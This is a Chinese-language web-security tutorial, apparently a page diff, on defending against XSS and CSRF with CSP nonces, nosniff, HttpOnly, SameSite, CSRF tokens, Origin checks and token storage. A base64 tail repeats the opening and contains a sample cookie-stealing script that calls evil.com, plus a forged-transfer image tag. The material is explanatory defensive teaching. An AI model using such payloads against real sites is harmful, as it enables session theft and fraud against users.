+另外，用了 `'strict-dynamic'` 的話，有 nonce 的 script 去載入別的 script 時，被載入的 script 不用 nonce 也能執行。所以如果其中有一支 loader 會照網址參數去載入 script，攻擊者就能透過它載入自己的程式。`'unsafe-inline'` 跟 nonce 寫在一起倒是沒關係，因為有 nonce 的時候，瀏覽器會忽略 `'unsafe-inline'`。
+
+</details>
+
+<details>
+<summary>深入：nosniff 是在回傳檔案時決定的，不是上傳時</summary>
+
+`X-Content-Type-Options` 跟它要保護的 `Content-Type`，都是 server 把存起來的檔案回傳時才設的，跟上傳那一次無關。這是兩趟不同的傳輸：
+
+- **上傳**（使用者把檔案傳給你）。這個 request 上的 `Content-Type` 是上傳的人自己填的，所以攻擊者可以任意設定。不要把它存起來之後拿來用。
+- **回傳**（server 把檔案傳給來看的人）。這時 `Content-Type` 由你的 server 自己設，通常依副檔名決定（`.png` 對應 `image/png`），再加上 `nosniff`。瀏覽器怎麼處理這個檔案，看的是這個 response。
+
+`nosniff` 叫看檔案那個人的瀏覽器相信回傳時的 `Content-Type`，不要再從位元組去猜。所以前提是這個 `Content-Type` 本身是對的。如果你照抄上傳者填的值，回傳成 `text/html`，`nosniff` 也會照單全收，把它當網頁顯示出來。這個 header 只負責讓瀏覽器照你的標籤走，標籤要先標對。
+
+那瀏覽器到底在什麼時候會猜？在 Chrome for Testing 156 跟 Firefox 159 上測試：準備一個存起來的檔案，內容是一個帶 `<script>` 的 HTML 頁面，用不同的標籤回傳，直接在分頁裡打開。
+
+| 送出的 `Content-Type` | 沒有 `nosniff` | 有 `nosniff` |
+|---|---|---|
+| 沒送 | script 執行了（瀏覽器猜成 HTML） | 沒執行 |
+| `text/plain` | 沒執行 | 沒執行 |
+| `image/png` | 沒執行 | 沒執行 |
+| `text/html` | 執行了 | 執行了 |
+
+只要正確標成 `image/png` 就夠了，兩個瀏覽器都沒有把標成圖片的檔案當成網頁。標籤沒送的時候，`nosniff` 才有作用。它在另一種執行方式上更重要，就是 `<script src="/uploads/x.txt">` 這種 tag。`script-src 'self'` 允許自己 origin 的任何檔案，上傳的檔案也算在內。拿一個內容是 JavaScript 的檔案，用這種方式載入：
+
+| 送出的 `Content-Type` | 沒有 `nosniff` | 有 `nosniff` |
+|---|---|---|
+| 沒送、`text/plain`、`text/html`、`application/octet-stream` | 當成 script 執行了 | 被封鎖 |
+| `image/png` | 被封鎖 | 被封鎖 |
+
+加了 `nosniff` 之後，測過的每一種非 JavaScript 標籤，兩個瀏覽器都拒絕當成 script 執行。所以只要上傳的檔案照它真正的類型回傳，就沒辦法冒充你的 script。
+
+受害的是第三個人：攻擊者上傳一個藏了 script 的檔案，你的 server 把它存起來，另一個使用者打開它的網址。同一個檔案要是透過 `<img>` 載入，瀏覽器只會把它當圖片的位元組解碼，不會執行。
+
+</details>
+
+### HttpOnly 只能減少損害，不能防止 XSS
+
+**`HttpOnly` 讓 XSS 讀不到 cookie 的值，但沒辦法讓 XSS 不去使用這個 session。** XSS 還是可以在 origin 裡面執行 `fetch('/transfer', ...)`，瀏覽器照樣自動帶上 HttpOnly cookie，server 也照常通過驗證。在 Chrome for Testing 156 跟 Firefox 159 上，`document.cookie` 列出了 `HttpOnly` cookie 以外的所有 cookie，而 same-origin 的 `fetch` POST 還是帶著它。
+
+| 能做到的事 | 沒有 `HttpOnly` | 有 `HttpOnly` |
+|---|---|---|
+| XSS 讀 `document.cookie` | ✅ | ❌ |
+| XSS 把 cookie 傳到攻擊者的 server | ✅ | ❌ |
+| XSS 在受害者的瀏覽器裡送出已驗證的 request | ✅ | ✅ |
+| 受害者關掉分頁之後，攻擊還能繼續 | ✅ | ❌ |
+| 從另一台裝置重放這個 cookie | ✅ | ❌ |
+
+第二列跟第三列看起來都是 XSS 發出一個 request，結果卻不一樣，因為瀏覽器只會把 cookie 帶給設它的那個網站。XSS 對 `evil.com` 發 request 的話，瀏覽器帶的是 `evil.com` 的 cookie，不會帶 `bank.com` 的。所以 script 要把 session 交給攻擊者，得先從 `document.cookie` 讀出它的值，再放進網址或 body 裡送出去。設了 `HttpOnly`，`document.cookie` 裡就沒有它，script 讀不到值，也就送不出去。XSS 對 `bank.com` 發的 request 倒是會帶上 cookie，只是 cookie 的值一直留在瀏覽器裡，攻擊者拿不到，只能趁分頁開著的時候借用。
+
+還是要設 `HttpOnly`。沒設的話，攻擊者能把 cookie 帶走，在自己的電腦上一直用到 server 結束這個 session 為止；設了之後，他只能透過受害者開著的那個分頁操作，分頁關了就沒了。但不要把它當成 XSS 的防線，防 XSS 要靠 output encoding 加上 CSP。
+
+<details>
+<summary>深入：放在記憶體裡的 token，XSS 一樣讀得到</summary>
+
+把 JWT 或 access token 放在記憶體裡（Zustand、React context、普通的 module 變數），**比放 `localStorage` 好，但 XSS 還是讀得到**。XSS 在你的 origin 裡執行，JS 碰得到的狀態，它都碰得到：
+
+```js
+// XSS payload，知道 store 在哪裡
+useAuthStore.getState().token
+// 或是從某個 DOM 節點沿著 React fiber tree 找到元件的 state
+```
+
+它比 `localStorage` 好的地方有兩個，都是在減少損害：
+
+- **通用的 XSS payload 比較難得手。** `localStorage.getItem('token')` 在每個網站上寫法都一樣。要讀 Zustand store，得先拿到那個 app 的 store，而每個 app 都不一樣。所以一支同時瞄準很多網站的 payload，很容易拿到 `localStorage` 裡的 token，要拿記憶體裡的就得針對個別 app 下工夫。
+- **分頁一關，token 就跟著消失。** payload 必須在 token 還在記憶體裡的時候執行。`localStorage` 的 token 存在磁碟上，重新整理、重開瀏覽器都還在，所以之後才執行的 XSS，就算隔了好幾天，還是找得到它。
+
+不過這比 `HttpOnly` 弱。`HttpOnly` cookie 完全讀不到；記憶體裡的 token 一旦被 payload 讀到，就能傳到攻擊者的 server，在任何裝置上重放，直到過期。這時只剩 token 的有效期限能限制損害，所以才會用短效的 access token（5 到 15 分鐘），再把長效的 refresh token 放在 HttpOnly cookie 裡，這樣偷到的 access token 只能用幾分鐘。不過只要 payload 還在執行，它就能自己呼叫 `/auth/refresh`。瀏覽器會自動帶上 refresh cookie，所以 payload 每呼叫一次，就拿到一個新的 access token 可以傳出去。要等 payload 停下來，最後傳出去的那個 token 才會在幾分鐘內失效。受害者關掉分頁之後，攻擊者就換不到新的 access token 了。因為 refresh token 在 HttpOnly cookie 裡，他讀不到，只能透過受害者開著的分頁去呼叫 `/auth/refresh`。反過來，如果 refresh token 放在 JS 讀得到的地方，被偷走之後，攻擊者可以一直自己換新的 access token，直到 refresh token 過期，受害者關不關分頁都一樣。
+
+</details>
+
+---
+
+## CSRF 的防線，一層一層看
+
+**讀這整張表時，先假設 XSS 已經防住了。** 這裡幾乎每一道 CSRF 防線，在攻擊者能做 XSS 之後都會失效，因為 XSS 是以你自己的 origin 身分執行，能直接讀 token、DOM 跟頁面狀態。最後一欄「XSS 進來之後還有用嗎？」就是把這層依賴寫出來。
+
+| 層 | 誰負責 | 做什麼 | XSS 進來之後還有用嗎？ |
+|---|---|---|---|
+| `SameSite` cookie | Browser + Server | `Set-Cookie: ...; SameSite=Lax`。單子如果是從別的網站遞來的，跑腿的人就不亮鑰匙。例外是你在別的網站點了連結，整個分頁換成你的網站，而且用的是 GET。跨站的 sub-resource request 跟跨站的 form POST 都不會帶 cookie。Chrome 從 Chrome 80（2020 年）起把沒寫 `SameSite` 的 cookie 當成 `Lax`，Firefox 跟 Safari 沒有，所以要明確寫出來。 | 沒用。XSS 在同一個 site 裡執行，cookie 照常帶上。 |
+| `SameSite=Strict` | Server | `Set-Cookie: ...; SameSite=Strict`。就連從別的網站點連結進來，第一個 request 也不帶 cookie。用在管理後台、跟錢有關的 endpoint。 | 沒用，理由同上。 |
+| CSRF token | Client + Server | 只印在你自己單子本上的暗號。server 在 form 或 response 裡放一個隨機 token，會改變狀態的 request 都要把它送回來。`evil.com` 讀不到你的頁面，因為同源政策（same-origin policy，SOP）不讓一個 origin 讀另一個 origin 的 response，所以它也就無法偽造這個 token。 | 沒用。XSS 直接從 DOM 讀出 token 一起送。 |
+| `Origin` / `Referer` 檢查 | Server | 單子上寫著它是從哪個網站遞出來的。瀏覽器會在 POST request 加上 `Origin` header。送到 `/transfer` 的 request 要是帶著 `Origin: https://evil.com`，就拒絕。 | 沒用。XSS 送出的 request 帶的是你真正的 `Origin`。 |
+| 照 HTTP method 的語意走 | Server | GET 永遠不改變狀態。圖片 tag 只能發 GET，發不了 POST，攻擊者就得多寫一點東西。 | 沒用。XSS 什麼 method 都能用。 |
+| 不用 cookie | 架構 | JWT 放在 `Authorization` header。不會被自動帶上，也就沒有 CSRF 的問題。 | 沒用，而且更糟。放在 `localStorage` 的 JWT，XSS 一行就能讀走。 |
+| 敏感操作前重新驗證 / MFA | Server + Client + 使用者 | 開保險箱之前，管理員先打電話問你本人。在重要操作前重新輸入密碼、輸入驗證器的一次性密碼（TOTP），或按一下安全金鑰（WebAuthn）。 | **部分有用。** XSS 自己變不出你的密碼，也沒辦法替你按金鑰。但頁面在它手上，它可以跳出一個看起來很正常的提示，等你自己填。這時它得先騙到你配合，沒辦法再悄悄完成。 |
+
+---
+
+## 為什麼 XSS 比較要緊
+
+XSS 一進來，所有常見的 CSRF 防線都會失效，上面那張表的最後一欄就是這個結果。OWASP 的 CSRF cheat sheet 用一句話講完：「Cross-Site Scripting (XSS) can defeat all CSRF mitigation techniques!」重新驗證是 XSS 進來之後唯一還有作用的一層，因為 XSS 沒有你的密碼跟金鑰，得想辦法讓你自己交出來。
+
+實際的優先順序：
+
+1. **先防 XSS。** 框架的自動 escape、CSP、存進來的內容先清過、nosniff，再用 `HttpOnly` 限制損害。
+2. **再疊上 CSRF 的防線。** SameSite、token、Origin 檢查。這些只有在 XSS 已經防住的前提下才有意義。
+3. **高風險的操作，加上重新驗證或 MFA。** XSS 成功之後它還有點用，攻擊者得騙你按下確認，沒辦法自己動手。
+
+---
+
+## 依架構一步步補強
+
+一樣的防線，依架構組合起來。每一條路線都從最陽春的版本開始，一次加一層。
+
+<details>
+<summary>一步步補強 cookie session 的 app</summary>
+
+防 XSS 的三樣東西要先做，後面稱為地基：CSP nonce、框架的自動 escape、nosniff。XSS 一進來，SameSite、CSRF token、Origin 檢查都會失效，`HttpOnly` 也只能限制損害。
+
+既有的 app 要補強，可以照下面第 0 步到第 6 步的順序。CSP nonce 要改每個 template、檢查每支第三方 script，是最花工夫的一步，所以排到第 4 步，讓便宜的先做。下表列出每一層的成本跟防禦價值：
+
+| 層 | 成本 | 價值 |
+|---|---|---|
+| `HttpOnly` + `Secure` | 各一行 | 限制損害，但不會阻止攻擊 |
+| `nosniff` | 一行 | 擋掉一條 XSS 路徑：上傳的檔案回傳時的 `Content-Type` 如果不是 JavaScript，用 `<script src>` 載入也不會執行。從其他地方進來的 XSS 不受影響 |
+| `SameSite` | 一行 | 攔下其他網站發起的典型 CSRF；從你自己的 subdomain 發起的攔不下來，其他攻擊也沒用 |
+| CSRF token | 每個 form 都要接 | XSS 一進來就失效 |
+| CSP nonce | 真正要排時程的工作：server 每個 request 產生一個 nonce，每個 template 都要放進去，每支第三方 script 都要檢查過。漏掉一個，頁面就壞了 | 整組裡價值最高的。它讓塞進來的 script 根本不會執行，而 XSS 正是能穿過其他每一層的那種攻擊 |
+
+既有的 app 這樣排，是為了補強時不把東西弄壞。昂貴但價值高的 CSP，等排得出時間再做。
+
+**0. 什麼都沒設的 cookie。** 全部暴露在外：XSS 讀得到，CSRF 用得到，還用明文傳送。
+
+```
+Set-Cookie: session=abc123
+```
+
+**1. 先把 cookie 鎖起來，順手加上那個免費的 header。** `HttpOnly` 讓 JS 讀不到它，`Secure` 讓它不走明文的 HTTP。`nosniff` 只要一行，放在這一批一起做，雖然它防的是第 4 步講的 script 執行那一層。
+
+```
+Set-Cookie: session=abc123; HttpOnly; Secure; Path=/
+X-Content-Type-Options: nosniff
+```
+
+XSS 沒辦法再把 cookie 傳出去了。但它還是可以在頁面裡*使用*這個 session，所以這一步只是減少損害，問題還在。
+
+**2. 用 `SameSite` 攔下典型的 CSRF。** 跨站的 sub-resource request（就是 `<img src="bank.com/transfer">` 那一招）跟跨站的 form POST，都不會再帶 cookie。Chrome 本來就把沒寫的 cookie 當成 `Lax`，但明確寫出來，也能關掉 Chrome 那兩分鐘的 POST 例外，而且 Firefox 跟 Safari 也會照一樣的規則走。
+
+```
+Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Lax; Path=/
+```
+
+管理後台跟跟錢有關的 endpoint 用 `SameSite=Strict`。
+
+**3. 在會改變狀態的 request 上加 CSRF token**，因為 `SameSite` 有漏洞。「site」指的是 scheme 加上可註冊網域（registrable domain），所以 `https://evil.bank.com` 跟 `https://bank.com` 是同一個 site。如果有一個 subdomain 落在別人手上（被接管的廢棄 subdomain、放使用者內容的 host），它能通過每一種 `SameSite` 檢查。實測時，`evil.bank.test` 上的 `<img>` 跟 form POST，在 Chrome 跟 Firefox 都帶上了 `bank.test` 標成 `Strict` 的 cookie。不過 `Origin` header 寫的還是 `https://evil.bank.test`，所以第 5 步在這裡用得上。另外，別的網站連到你的某個 GET 網址時，`Lax` 還是會帶 cookie，所以會改變狀態的 GET 一樣有風險。
+
+```html
+<form action="/transfer" method="POST">
+  <input type="hidden" name="csrf_token" value="{{ csrfToken }}">
+</form>
+```
+
+```js
+// server，收到 POST 時。兩邊都要先確認有值：undefined !== undefined 是 false，
+// 不檢查的話，session 沒有 token、request 也沒帶 token，就會直接通過。
+if (!session.csrfToken || req.body.csrf_token !== session.csrfToken) return res.status(403).end()
+```
+
+**4. 把地基寫出來。** CSP nonce 跟框架的自動 escape（`nosniff` 第 1 步已經加了）。這就是開頭講的地基。如果你是新專案，做到這裡時這一項早就完成了，前面幾步是之後才補上的便宜基本功。
+
+```
+Content-Security-Policy: script-src 'self' 'nonce-RANDOM'
+```
+
+```jsx
+<div>{userInput}</div>   // 安全，框架會幫你 escape
+// 永遠不要把使用者的資料丟給 dangerouslySetInnerHTML / v-html / innerHTML
+```
+
+**5. 拒絕外來的 `Origin`**，用在會改變狀態的路由上。便宜的第二層。實測時，瀏覽器在每個 POST 上都送了 `Origin`，同 origin 的 form 跟 `fetch` 也一樣，而一般的 GET 沒有送，所以要在會改變狀態的 method 上檢查。POST 沒帶 `Origin`，不代表它就是你自己送的，這段檢查也會拒絕它。
+
+```js
+if (req.method === 'POST' && req.headers.origin !== 'https://bank.com') return res.status(403).end()
+```
+
+**6. 危險的操作要重新驗證。** 轉帳、改 email、刪帳號，都要重新輸入密碼或按一下安全金鑰。XSS 進來之後，只剩這一層還需要你本人點頭。
+
+</details>
+
+<details>
+<summary>補強 JWT 的 app，先打地基</summary>
+
+動 token 之前，先把地基打好。token 放在哪裡（下面的 A、B、C）只能在 XSS 已經進來之後減少損害，只有一層能一開始就不讓 XSS 進來，所以它排第一。
+
+**D. 地基：讓 XSS 根本不會執行。** CSP nonce、框架的自動 escape、nosniff，敏感操作前重新驗證。一個把 token 放在 `localStorage`、但 CSP 設得很完整的 app，可能比 token 放得很講究、卻沒有 CSP 的 app 安全，因為後者還是讓塞進來的 script 執行。這是唯一能不讓攻擊者進來、而不只是減少損害的一層。
+
+```
+Content-Security-Policy: script-src 'self' 'nonce-RANDOM'
+X-Content-Type-Options: nosniff
+```
+
+接著決定 token 放哪裡。這幾項用字母編號，不像前面 cookie 那條用數字，因為只能選一個，不是全部都做。A、B、C 都在回答「token 放在哪裡」這個問題，後一個取代前一個。能做到哪一個，就選最後面那個。
+
+**A. Token 放 `localStorage`。** 最糟。XSS 一行就偷走，而且在過期前能從任何裝置重放。
+
+```js
+localStorage.setItem('token', jwt)   // 不要這樣做
+```
+
+**B. Token 放記憶體。** 一個 module 變數或 store，不寫進任何儲存空間。分頁一關它就消失，之後才執行的 XSS 什麼都找不到。但分頁開著的時候執行的 XSS 還是讀得到，也能把它傳出去，攻擊者拿到的 token 在過期前都能用。取代 A。
+
+```js
+let accessToken = null
+function setToken(t) { accessToken = t }
+```
+
+**C. 短效的 access token 放記憶體，refresh token 放 `HttpOnly` cookie。** access token 在記憶體變數裡只用 5 到 15 分鐘；refresh token 放在 JS 永遠讀不到的地方。取代 B。
+
+```
+Set-Cookie: refresh=...; HttpOnly; Secure; SameSite=Strict; Path=/auth/refresh
+```
+
+```js
+// 背景更新 token，瀏覽器會自己帶上 refresh cookie
+const res = await fetch('/auth/refresh', { credentials: 'include' })
+accessToken = (await res.json()).accessToken
+```
+
+XSS 讀不到 refresh token，但上面這兩行它也能照跑。實測時，頁面上的一段 script 呼叫了三次 `/auth/refresh`，瀏覽器每次都自動帶上 refresh cookie，script 也每次都讀到新的 access token，兩個瀏覽器都一樣。前面 `HttpOnly` 那節也是這樣，cookie 的值讀不到，request 照樣帶著它出去。所以只要分頁開著，payload 每幾分鐘就能拿一個新的 token 傳出去。分頁關掉以後 payload 就停了，最後傳出去的那個 access token 幾分鐘內就過期，refresh token 則從頭到尾沒離開過瀏覽器。
+
+refresh cookie 會被自動帶上，所以 `/auth/refresh` 自己就有 CSRF 的問題。在這個 cookie 上設 `SameSite=Strict`，其他網站發起的 request 就不會帶它；但兄弟 subdomain 屬於同一個 site，還是會帶，所以這個 endpoint 也要檢查 `Origin`。Strict 不會打斷正常流程。實測時，使用者從別的網站點連結進來，頁面接著呼叫 `/auth/refresh`，這個 request 有帶上 `Strict` 的 cookie，因為它是從你自己的頁面發出的。這樣一來，CSRF 要處理的範圍就從整個 app 縮到一個 endpoint。
+
+最穩的 JWT app 是 D 加 C：不讓 XSS 進來。萬一進來了，受害者的分頁開著多久，它就能透過 `/auth/refresh` 拿新的 token 拿多久。不過有了 C，分頁關掉幾分鐘後，它傳出去的 token 都會失效。只要驗證資訊放在 header 裡，就不需要 CSRF token，因為 JWT 不會被自動帶上。還在用 cookie 驗證的路由，就是 cookie app，照 cookie app 的方式防。
+
+</details>
+
+---
+
+## 參考資料
+
+- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
+- [OWASP CSRF Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html)
+- [Content Security Policy (MDN)](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP)
+- [SameSite cookies explained (web.dev)](https://web.dev/articles/samesite-cookies-explained)
+- [Trusted Types (web.dev)](https://web.dev/articles/trusted-types)
+- [Content Security Policy Level 3 (W3C)](https://w3c.github.io/webappsec-csp/)
+- [HTML Standard: nonce attributes](https://html.spec.whatwg.org/multipage/urls-and-fetching.html#nonce-attributes)
+- [SameSite updates (Chromium)](https://www.chromium.org/updates/same-site/)
+16:Ta358,LS0tCnRpdGxlOiAiWFNTIOi3nyBDU1JGIOWQhOimgeaAjum6vOmYsu+8jOeCuuS7gOm6vOWFiOiZleeQhiBYU1MiCmNyZWF0ZWRBdDogMjAyNS0wMy0zMFQxNTozOTowMAp0YWdzOiBbc2VjdXJpdHksIHhzcywgY3NyZiwgd2ViLCBjb29raWVdCmRlc2NyaXB0aW9uOiAiQ1NSRiDlnKjpoIHpnaLlpJbpnaLpqJnngI/opr3lmajpgIHlh7ogcmVxdWVzdO+8jFhTUyDnm7TmjqXlnKjpoIHpnaLoo6Hln7fooYzvvJtYU1Mg5LiA5pem6YCy5L6G77yMQ1NSRiDnmoTpmLLnt5rlsLHlhajpg6jlpLHmlYjjgILlk6rkuIDpgZPpmLLnt5rog73mlJTkuIvlk6rkuIDnqK7mlLvmk4rjgIHngI/opr3lmajnj77lnKjmgI7purzomZXnkIYgU2FtZVNpdGXjgIFub25jZSDot58gbm9zbmlmZu+8jOS7peWPiiBjb29raWUgc2Vzc2lvbiDot58gSldUIOWFqeeoriBhcHAg6KaB5oCO6bq85LiA5q2l5q2l6KOc5by344CCIgotLS0KCuS9oOeZu+WFpeS6hiBgYmFuay5jb21g77yM5o6l6JGX5Zyo5Y+m5LiA5YCL5YiG6aCB5omT6ZaLIGBldmlsLmNvbWDjgILpgqPkuIDpoIHoo6HmnInpgJnkuIDooYzvvJoKCmBgYGh0bWwKPGltZyBzcmM9Imh0dHBzOi8vYmFuay5jb20vdHJhbnNmZXI/dG89ZXZpbCZhbW91bnQ9MTAwMCI+CmBgYAoK54CP6Ka95Zmo5pyD5bCNIGBiYW5rLmNvbWAg55m85Ye65LiA5YCLIHJlcXVlc3TjgILpgY7ljrvlpb3lub7lubTvvIzkuI3nrqHmmK/lk6rkuIDpoIHnmbzotbfnmoTvvIzlj6ropoEgcmVxdWVzdCDmmK/pgIHlvoAgYGJhbmsuY29tYO+8jOeAj+imveWZqOWwseacg+aKiiBgYmFuay5jb21gIOeahCBzZXNzaW9uIGNvb2tpZSDkuIDotbfluLbkuIrjgIJzZXNzaW9uIGNvb2tpZSDmmK/nmbvlhaXmmYIgYGJhbmsuY29tYCDlrZjlnKjngI/opr3lmajoo6HnmoTkuIDlsI/mrrXlgLzvvIxzZXJ2ZXIg6K6A5Yiw5a6D77yM5bCx55+l6YGT6YCZ5YCLIHJlcXVlc3Qg5piv5L2g6YCB55qE44CC5pa85piv6YCZ562G6L2J5biz5oiQ56uL5LqG44CCCgrpgJnlsLHmmK8gQ1NSRu+8iENyb3NzLVNpdGUgUmVxdWVzdCBGb3JnZXJ577yM6Leo56uZ6KuL5rGC5YG96YCg77yJ44CC5L2g5LuA6bq86YO95rKS6bue77yM5pS75pOK6ICF5Y+q5piv6aiZ54CP6Ka95Zmo6YCB5Ye65LiA5YCLIHJlcXVlc3TvvIzlsLHlgJ/nlKjkuobkvaDlt7LntpPnmbvlhaXnmoQgc2Vzc2lvbuOAggoK6YKj6YCZ5YCLIGA8aW1nPmAg54++5Zyo6YKE5pyJ55So5ZeO77yf5aSn5aSa5rKS5pyJ5LqG44CC5Zyo5pys5qmf55SoIEhUVFBTIHNlcnZlciDmia7mvJQgYGJhbmsudGVzdGAg6LefIGBldmlsLnRlc3RgIOa4rOippueahOipse+8jENocm9tZSBmb3IgVGVzdGluZyAxNTYg5Y+q6YCB5Ye65qiZ5LqGIGBTYW1lU2l0ZT1Ob25lYCDnmoQgY29va2ll77yM5Zug54K65b6eIENocm9tZSA4MO+8iDIwMjAg5bm06Zm457qM5LiK57ea77yJ6ZaL5aeL77yM5rKS5a+rIGBTYW1lU2l0ZWAg55qEIGNvb2tpZSDmnIPooqvnlbbmiJAgYFNhbWVTaXRlPUxheGDvvIzliKXnmoTntrLnq5nnmoTlnJbniYfnmbzlh7rnmoQgcmVxdWVzdCDlsLHkuI3mnIPluLblroPjgIJGaXJlZm94IDE1OSDkuIDlgIsgY29va2llIOmDveaykumAge+8jOWboOeCuuWug+eahCBUb3RhbCBDb29raWUgUHJvdGVjdGlvbu+8iDIwMjIg5bm0IDYg5pyI6LW36aCQ6Kit6ZaL5ZWf77yJ5pyD5ZyoIGBldmlsLnRlc3RgIOijoeWPpuWklue1piBgYmFuay50ZXN0YCDkuIDlgIvnqbrnmoQgY29va2llIGphcuOAglNhZmFyaSDliYfmmK/lvp4gMTMuMe+8iDIwMjAg5bm0IDMg5pyI77yMV2ViS2l0IOeahOWFrOWRiu+8iei1t++8jOmgkOioreWwseS4jeWcqOmAmeeorui3qOermSByZXF1ZXN0IOS4iuW4tiBjb29raWXjgIIKCuS4jemBju+8jOimgeaYr+aKiiBgPGltZz5gIOaPm+aIkOS4gOWAi+acg+iHquW3semAgeWHuiBQT1NUIOWIsCBgYmFuay50ZXN0L3RyYW5zZmVyYCDnmoQgZm9ybe+8jOacieWFqeeoruaDheazgSBjb29raWUg5Y+I5pyD6KKr5bi25LiK44CCRmlyZWZveCDmnIPpgIHlh7rmspLlr6sgYFNhbWVTaXRlYCDnmoQgY29va2ll77yM5Zug54K6IEZpcmVmb3gg5rKS5pyJ5oqK6aCQ6Kit5YC85pS55oiQIGBMYXhg44CCQ2hyb21lIOS5n+acg+mAge+8jOS9huWPqumZkCBjb29raWUg6Kit5LiL5LmL5b6M55qE5YWp5YiG6ZCY5YWn77yM6YCZ5pivIENocm9tZSDnqLHngrrjgIxMYXggKyBQT1NU44CN55qE5pqr5pmC5L6L5aSW77yIW0Nocm9taXVtIOeahCBTYW1lU2l0ZSDmm7TmlrDntIDpjIRdKGh0dHBzOi8vd3d3LmNocm9taXVtLm9yZy91cGRhdGVzL3NhbWUtc2l0ZS8p77yJ44CC55m75YWlIDEzMCDnp5Llvozlho3pgIHkuIDmrKHvvIxDaHJvbWUg5bCx5rKS5bi25LqG44CC5qiZ5LqGIGBTYW1lU2l0ZT1MYXhgIOaIliBgU3RyaWN0YCDnmoQgY29va2ll77yM5LiK6Z2i6YCZ5bm+56iu5oOF5rOB6YO95rKS6KKr6YCB5Ye644CC5omA5LulIENTUkYg6IO955So55qE6Lev5q+U5Lul5YmN5bCR77yM5L2G5rKS5a+rIGBTYW1lU2l0ZWAg55qEIGNvb2tpZSDpgoTmmK/mnInpoqjpmqrjgIIKCi0tLQoK5YaN55yL5Y+m5LiA5YCL5oOF5aKD44CC5L2g6YCb5YiwIGBmb3J1bS5jb21g77yM6K6A5Yiw5p+Q5Lq655qE55WZ6KiA77yM55WZ6KiA5YWn5a655piv77yaCgpgYGBodG1sCjxzY3JpcHQ+ZmV0Y2goJ2h0dHBzOi8vZXZpbC5jb20vc3RlYWw/Yz0nICsgZG9jdW1lbnQuY29va2llKTwvc2NyaXB0PgpgYGAKCuWmguaenCBgZm9ydW0uY29tYCDmiornlZnoqIDljp/lsIHkuI3li5XnlbbmiJAgSFRNTCDmlL7pgLLpoIHpnaLvvIzmspLlgZogZXNjYXBl77yI5oqKIGA8YCDmj5vmiJAgYCZsdDtg77yM6K6T5a6D6aGv56S65oiQ5paH5a2X77yJ77yM6YCZ5q61IHNjcmlwdCDlsLHmnIPlnKggYGZvcnVtLmNvbWAg55qEIG9yaWdpbiDoo6Hln7fooYzjgIJvcmlnaW4g5pivIHNjaGVtZeOAgWhvc3Qg6LefIHBvcnQg5LiJ6ICF5ZCI6LW35L6G77yM6YCZ6KOh5bCx5pivIGBodHRwczovL2ZvcnVtLmNvbWDjgILngI/opr3lmajmiormr4/lgIsgb3JpZ2luIOeahOizh+aWmeWIhumWi+aUvu+8jOiAjOWcqOafkOWAiyBvcmlnaW4g6KOh6LeR55qE56iL5byP77yM6YKj5YCLIG9yaWdpbiDmk4HmnInnmoTmnbHopb/lroPpg73norDlvpfliLDjgILmiYDku6XpgJnmrrUgc2NyaXB0IOiDveiugOWIsOmggemdoueahCBET03jgIFjb29raWXvvIjmqJnkuoYgYEh0dHBPbmx5YCDnmoTpmaTlpJbvvInot58gbG9jYWxTdG9yYWdl77yM5pS75pOK6ICF5bCx5ou/5Yiw5LqG5L2g55qEIHNlc3Npb27jgIIKCumAmeWwseaYryBYU1PvvIhDcm9zcy1TaXRlIFNjcmlwdGluZ++8jOi3qOermeiFs+acrOaUu+aTiu+8ieOAguaUu+aTiuiAheWhnumAsuS+hueahOeoi+W8j++8jOWft+ihjOi1t+S+huWwseWDj+aYryBgZm9ydW0uY29tYCDoh6rlt7Hlr6vnmoTjgIIKCi0tLQoK5oqK5L2g55m75YWl55qE57ay56uZ5oOz5oiQ5LiA5qOf5aSn5qiT5ZCn44CCc2VydmVyIOaYr+Wkp+aok+eahOeuoeeQhuWToe+8jOS9oOWcqOijoemdouacieS4gOaItuOAgueAj+imveWZqOaYr+W5q+S9oOi3keiFv+eahOS6uu+8jOi6q+S4iuW4tuiRl+S9oOmCo+S4gOaItueahOmRsOWMme+8jOS5n+WwseaYryBzZXNzaW9uIGNvb2tpZeOAguavj+W8teWWruWtkOWwseaYr+S4gOWAiyByZXF1ZXN044CC6LeR6IW/55qE5Lq65oqK5Zau5a2Q6YCB6YCy5aSn5qiT5pmC5pyD5Lqu5Ye66ZGw5YyZ77yM566h55CG5ZOh55yL5Yiw6ZGw5YyZ77yM5bCx54Wn5Zau5a2Q5LiK5a+r55qE6L6m44CCCgrlhanlgIvmlLvmk4rogIXnq5nnmoTkvY3nva7kuI3kuIDmqKPjgIJDU1JGIOeahOaUu+aTiuiAheWcqCoq5aSW6Z2iKirjgILku5bmspLmnInpkbDljJnvvIzlj6rog73lvp7liKXnmoTntrLnq5nnmoTpoIHpnaLpgZ7kuIDlvLXlgYfllq7lrZDntabot5Hohb/nmoTkurrvvIzogIzot5Hohb/nmoTkurrnhafmqKPkuq7lh7rkvaDnmoTpkbDljJnvvIznrqHnkIblk6HkuZ/lsLHnhafovqbkuobjgIJYU1Mg55qE5pS75pOK6ICF5YmH5piv5oqK5Zau5a2Q5re36YCyKirkvaDoh6rlt7HnmoTpoIHpnaLoo6EqKuOAgue2suermeaKiuWIpeS6uuWvq+eahOeVmeiogOebtOaOpeeVtuaIkCBIVE1MIOaUvumAsuS9oOeahOmggemdou+8jOWwseetieaWvOWcqOS9oOeahOWWruWtkOacrOS4iueVmeS6huS4gOWAi+ashOS9jee1pumZjOeUn+S6uuWhq+OAguW+numCo+WAi+ashOS9jeWvq+WHuuWOu+eahOWWruWtkO+8jOi3keiFv+eahOS6uui3n+euoeeQhuWToemDveWIhuS4jeWHuuaYr+S4jeaYr+S9oOWvq+eahO+8jOiAjOS4lOWhq+mCo+WAi+ashOS9jeeahOS6uu+8jOmChOeci+W+l+imi+S9oOWWruWtkOacrOS4iueahOavj+S4gOmggeOAggoKLS0tCgojIyDlhannqK7mlLvmk4rvvIzlhannqK7lqIHohIXmqKHlnosKCioqWFNTKirvvJo8bWFyaz7kuI3mmK/miJHlr6vnmoTnqIvlvI/norzvvIzlnKjmiJHnmoQgb3JpZ2luIOijoeWft+ihjOOAgjwvbWFyaz7mlLvmk4rogIXmioogcGF5bG9hZCDmlL7pgLLmnIPooqvlrZjotbfkvobnmoTlh